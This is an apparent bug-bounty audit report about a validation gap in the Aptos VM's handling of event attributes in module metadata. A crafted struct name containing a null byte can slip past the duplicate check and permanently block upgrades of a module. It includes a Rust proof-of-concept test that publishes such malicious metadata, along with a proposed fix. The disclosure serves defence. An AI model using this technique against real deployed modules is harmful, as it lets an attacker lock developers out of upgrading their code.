# Audit Report

## Title
Event Attribute Duplicate Detection Bypass via Invalid Metadata Keys

## Summary
The event validation system contains a critical validation gap where event attributes on structs are not validated to ensure struct names are valid Move identifiers or correspond to actual structs in the module bytecode. This allows attackers to craft modules with invalid struct names (e.g., containing null bytes) in metadata that bypass duplicate detection and permanently block legitimate module upgrades.

## Finding Description

The event validation system has an inconsistent validation approach compared to resource group attributes. When validating module metadata during publishing, event attributes receive no validation of their struct name keys.

In `verify_module_metadata_for_module_publishing()`, event attributes only check if the feature flag is enabled and skip all other validation: [1](#0-0) 

In contrast, resource group attributes are properly validated by calling `is_valid_resource_group()` which validates both that the string is a valid Move identifier and that the struct exists in the bytecode: [2](#0-1) 

This validation gap allows an attacker to manually craft module bytecode (bypassing the Move compiler) with a `struct_attributes` BTreeMap containing entries with invalid struct names:
- `"MyEvent"` → `[KnownAttribute::event()]` (valid)
- `"MyEvent\x00"` → `[KnownAttribute::event()]` (invalid - contains null byte)

Since these are different Rust strings, the duplicate detection in `extract_event_metadata()` treats them as separate entries: [3](#0-2) 

The HashSet insertion at line 264 succeeds for both strings since they differ, bypassing the intended duplicate detection.

During module upgrades, the compatibility check in `validate_module_events()` requires all event attributes from the old module to be present in the new module: [4](#0-3) 

When a legitimate upgrade (compiled normally) only has `"MyEvent"` but the old module has both `"MyEvent"` and `"MyEvent\x00"`, the compatibility check fails because `new_event_structs.remove("MyEvent\x00")` returns false, triggering the error at line 74.

The feasibility of manually crafting such bytecode is demonstrated in existing tests: [5](#0-4) 

## Impact Explanation

**Medium Severity** per Aptos bug bounty criteria: "State inconsistencies requiring manual intervention"

1. **Denial of Service on Module Upgrades**: Legitimate module upgrades are permanently blocked with `EVENT_METADATA_VALIDATION_ERROR`, requiring manual intervention or hardfork to recover, as demonstrated in upgrade compatibility tests: [6](#0-5) 

2. **Persistent State Inconsistency**: Modules exist on-chain with semantically invalid metadata that violates the system's integrity assumptions. The metadata contains struct names that are not valid Move identifiers, contradicting the fundamental design assumption that all struct names in metadata correspond to actual structs in the module.

3. **Griefing Attack Vector**: Malicious actors can permanently pollute any module they publish with invalid metadata, creating a persistent attack surface that affects module upgradeability—a core blockchain functionality.

This does not directly cause fund loss or consensus violations but creates a verifiable exploit path that compromises module upgradeability guarantees.

## Likelihood Explanation

**Moderate to High Likelihood:**

1. **Attack Prerequisites**: Attacker needs standard ability to publish modules and capability to craft bytecode manually. The test infrastructure demonstrates this is feasible: [7](#0-6) 

2. **Detection Difficulty**: The malicious metadata passes all current validation checks because event attribute validation is explicitly skipped in the publishing validation flow: [8](#0-7) 

3. **Persistence**: Once published, the malformed metadata is permanently stored on-chain and will block all future upgrade attempts.

4. **Attack Surface**: Any module with event attributes becomes vulnerable to this attack pattern during publishing and upgrades.

## Recommendation

Add identifier validation and bytecode struct existence checks for event attributes, mirroring the validation performed for resource groups:

```rust
// In verify_module_metadata_for_module_publishing
for (struct_, attrs) in &metadata.struct_attributes {
    for attr in attrs {
        // ... existing resource group checks ...
        
        if features.is_module_event_enabled() && attr.is_event() {
            // Add validation similar to is_valid_resource_group
            if let Ok(ident_struct) = Identifier::new(struct_) {
                if !structs.contains_key(ident_struct.as_ident_str()) {
                    return Err(AttributeValidationError {
                        key: struct_.clone(),
                        attribute: attr.kind,
                    }.into());
                }
            } else {
                return Err(AttributeValidationError {
                    key: struct_.clone(),
                    attribute: attr.kind,
                }.into());
            }
            continue;
        }
        // ... rest of validation ...
    }
}
```

This ensures event attribute struct names are valid Move identifiers and reference actual structs in the module bytecode before allowing publication.

## Proof of Concept

The following test demonstrates the vulnerability by crafting a module with invalid event metadata:

```rust
#[test]
fn test_invalid_event_struct_name_bypass() {
    let mut h = MoveHarness::new_with_features(vec![FeatureFlag::MODULE_EVENT], vec![]);
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());
    
    // Compile a valid module with one event struct
    let source = r#"
        module 0xf00d::M {
            #[event]
            struct MyEvent { value: u64 }
        }
    "#;
    
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default())
        .expect("building package must succeed");
    let code = package.extract_code();
    let mut compiled_module = CompiledModule::deserialize(&code[0]).unwrap();
    
    // Craft malicious metadata with invalid struct name
    let mut metadata_value = RuntimeModuleMetadataV1::default();
    metadata_value.struct_attributes.insert("MyEvent".to_string(), vec![KnownAttribute::event()]);
    metadata_value.struct_attributes.insert("MyEvent\x00".to_string(), vec![KnownAttribute::event()]);
    
    let metadata = Metadata {
        key: APTOS_METADATA_KEY_V1.to_vec(),
        value: bcs::to_bytes(&metadata_value).unwrap(),
    };
    
    let mut malicious_code = vec![];
    compiled_module.metadata = vec![metadata];
    compiled_module.serialize(&mut malicious_code).unwrap();
    
    // Publish malicious module - should succeed due to missing validation
    let package_metadata = package.extract_metadata().unwrap();
    let result = h.run_transaction_payload(
        &account,
        aptos_stdlib::code_publish_package_txn(
            bcs::to_bytes(&package_metadata).unwrap(),
            vec![malicious_code],
        ),
    );
    assert_success!(result); // Malicious module publishes successfully
    
    // Now attempt legitimate upgrade - should fail
    let result = h.publish_package(&account, path.path());
    assert_vm_status!(result, StatusCode::EVENT_METADATA_VALIDATION_ERROR); // Upgrade blocked!
}
```

This PoC demonstrates that modules with invalid event metadata can be published and subsequently block legitimate upgrades.

### Citations

**File:** types/src/vm/module_metadata.rs (L402-403)
```rust
    if let Ok(ident_struct) = Identifier::new(struct_) {
        if let Some((struct_handle, struct_def)) = structs.get(ident_struct.as_ident_str()) {
```

**File:** types/src/vm/module_metadata.rs (L507-509)
```rust
            if features.is_module_event_enabled() && attr.is_event() {
                continue;
            }
```

**File:** aptos-move/aptos-vm/src/verifier/event_validation.rs (L70-76)
```rust
            let original_event_structs = extract_event_metadata(&metadata)?;
            for member in original_event_structs {
                // Fail if we see a removal of an event attribute.
                if !new_event_structs.remove(&member) {
                    metadata_validation_err("Invalid change in event attributes")?;
                }
            }
```

**File:** aptos-move/aptos-vm/src/verifier/event_validation.rs (L258-270)
```rust
pub(crate) fn extract_event_metadata(
    metadata: &RuntimeModuleMetadataV1,
) -> VMResult<HashSet<String>> {
    let mut event_structs = HashSet::new();
    for (struct_, attrs) in &metadata.struct_attributes {
        for attr in attrs {
            if attr.is_event() && !event_structs.insert(struct_.clone()) {
                metadata_validation_err("Found duplicate event attribute")?;
            }
        }
    }
    Ok(event_structs)
}
```

**File:** aptos-move/e2e-move-tests/src/tests/attributes.rs (L159-183)
```rust
    let mut compiled_module = CompiledModule::deserialize(&code[0]).unwrap();

    let mut value = RuntimeModuleMetadataV1 {
        error_map: BTreeMap::new(),
        struct_attributes: BTreeMap::new(),
        fun_attributes: BTreeMap::new(),
    };
    let fake_attribute = bcs::to_bytes(&FakeKnownAttribute {
        kind: 5,
        args: vec![],
    })
    .unwrap();
    let known_attribute = bcs::from_bytes::<KnownAttribute>(&fake_attribute).unwrap();
    value
        .fun_attributes
        .insert("view".to_string(), vec![known_attribute]);

    let metadata = Metadata {
        key: APTOS_METADATA_KEY_V1.to_vec(),
        value: bcs::to_bytes(&value).unwrap(),
    };

    let mut code = vec![];
    compiled_module.metadata = vec![metadata];
    compiled_module.serialize(&mut code).unwrap();
```

**File:** aptos-move/e2e-move-tests/src/tests/attributes.rs (L293-320)
```rust
fn build_package_and_insert_attribute(
    source: &str,
    struct_attr: Option<(&str, FakeKnownAttribute)>,
    func_attr: Option<(&str, FakeKnownAttribute)>,
) -> (Vec<Vec<u8>>, Vec<u8>) {
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();

    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default())
        .expect("building package must succeed");
    let code = package.extract_code();
    // There should only be one module
    assert!(code.len() == 1);
    let mut compiled_module = CompiledModule::deserialize(&code[0]).unwrap();
    let mut value = RuntimeModuleMetadataV1 {
        error_map: BTreeMap::new(),
        struct_attributes: BTreeMap::new(),
        fun_attributes: BTreeMap::new(),
    };

    if let Some((name, attr)) = struct_attr {
        let fake_attribute = bcs::to_bytes(&attr).unwrap();
        let known_attribute = bcs::from_bytes(&fake_attribute).unwrap();
        value
            .struct_attributes
            .insert(name.to_string(), vec![known_attribute]);
    };
```

**File:** aptos-move/e2e-move-tests/src/tests/module_event.rs (L109-123)
```rust
    // Incompatible upgrades -- remove existing event attribute
    let source = r#"
        module 0xf00d::M {
            struct Event1 { }

            #[event]
            struct Event2 { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_vm_status!(result, StatusCode::EVENT_METADATA_VALIDATION_ERROR);
}
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1715-1716)
```rust
            verify_module_metadata_for_module_publishing(m, self.features())
                .map_err(|err| Self::metadata_validation_error(&err.to_string()))?;
```
